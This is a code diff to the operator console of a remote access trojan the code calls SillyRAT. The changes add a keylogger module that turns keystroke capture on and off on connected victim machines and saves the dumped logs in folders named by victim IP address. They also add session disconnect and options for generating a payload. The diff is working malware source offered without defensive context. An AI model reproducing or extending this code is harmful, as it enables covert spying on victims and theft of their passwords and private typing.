@@ -8,6 +8,8 @@ import signal
 import subprocess
 import argparse
 import threading
+import PyInstaller.__main__
+from datetime import datetime
 
 __LOGO__ = """
  ____  _ _ _       ____      _  _____ 
@@ -86,9 +88,10 @@ class PULL:
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
-            ('generate', 'Generate a new Client Application'),
+            ('disconnect', 'Disconnect from Current Client'),
             ('clear', 'Clear Screen'),
             ('shell'  , 'Launch a New Terminal/Shell.'),
+            ('keylogger', 'KeyLogger Module'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -101,7 +104,7 @@ class PULL:
             ('help', 'Shows manual for commands'),
             ('sessions', 'Show all connected clients to the server'),
             ('connect', 'Connect to a Specific Client'),
-            ('generate', 'Generate a new Client Application'),
+            ('disconnect', 'Disconnect from Current Client'),
             ('clear', 'Clear Screen'),
             ('exit', 'Exit from SillyRAT!')
         ]
@@ -161,6 +164,7 @@ class COMMCENTER:
     CLIENTS = []
     COUNTER = 0
     CURRENT = ()    #### Current Target Client ####
+    KEYLOGS = []
 
     def c_help(self, vals):
         if len(vals) > 1:
@@ -194,6 +198,9 @@ class COMMCENTER:
             sys.stdout.write("\n")
             pull.error("Invalid Syntax!")
             sys.stdout.write("\n")
+
+    def c_disconnect(self):
+        self.CURRENT = ()
 
     def c_sessions(self):
         headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
@@ -232,21 +239,48 @@ class COMMCENTER:
             pull.error("You need to connect before execute this command!")
             sys.stdout.write("\n")
 
-    def c_generate(self, vals):
-        if len(vals) == 5:
-            ip = vals[1]
-            port = int(vals[2])
-            platform = vals[3]
-            path = vals[4]
-
-            
-        else:
-            sys.stdout.write("\n")
-            pull.error("Invalid Syntax!")
-            sys.stdout.write("\n")
-
     def c_clear(self):
         subprocess.call(["clear"], shell=True)
+
+    def c_keylogger(self, args):
+        if self.CURRENT:
+            if len(args) == 2:
+                if args[1] == "status":
+                    return
+                elif args[1] == "on":
+                    self.CURRENT[1].send_data("keylogger:on")
+                    result = self.CURRENT[1].recv_data()
+                    if result.strip(" "):
+                        print(result) 
+
+                elif args[1] == "off":
+                    self.CURRENT[1].send_data("keylogger:off")
+                    result = self.CURRENT[1].recv_data()
+                    if result.strip(" "):
+                        print(result) 
+
+                elif args[1] == "dump":
+                    self.CURRENT[1].send_data("keylogger:dump")
+                    result = self.CURRENT[1].recv_data()
+                    dirname = os.path.dirname(__file__)
+                    dirname = os.path.join( dirname, 'keylogs' )
+                    if not os.path.isdir(dirname):
+                        os.mkdir(dirname)
+                    dirname = os.path.join( dirname, '%s:%d' % (self.CURRENT[1].ip, self.CURRENT[1].port) )
+                    if not os.path.isdir(dirname):
+                        os.mkdir(dirname)
+                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S") )
+                    fl = open( fullpath, 'w' )
+                    fl.write( result )
+                    fl.close()
+                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
+                    
+                else:
+                    pull.error("Invalid Syntax!")
+            else:
+                pull.error("Invalid Syntax!")
+        else:
+            pull.error("You need to connect before execute this command!")
 
     def c_exit(self):
         sys.stdout.write("\n")
@@ -315,12 +349,14 @@ class INTERFACE(COMMCENTER):
                 self.c_ping(vals)
             elif vals[0] == "connect":
                 self.c_connect(vals)
+            elif vals[0] == "disconnect":
+                self.c_disconnect()
             elif vals[0] == "shell":
                 self.c_shell()
-            elif vals[0] == "generate":
-                self.c_generate(vals)
             elif vals[0] == "clear":
                 self.c_clear()
+            elif vals[0] == "keylogger":
+                self.c_keylogger(vals)
 
     def launch(self):
         pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
@@ -357,6 +393,8 @@ def main():
 
     parser.add_argument('-a', '--address', dest="address", default="0.0.0.0", type=str, help="Address to Bind to")
     parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
+    parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
+    parser.add_argument('--generate'     , dest="generate", default=False, action="store_true", help="Generate the Payload")
 
     parser = parser.parse_args()
 
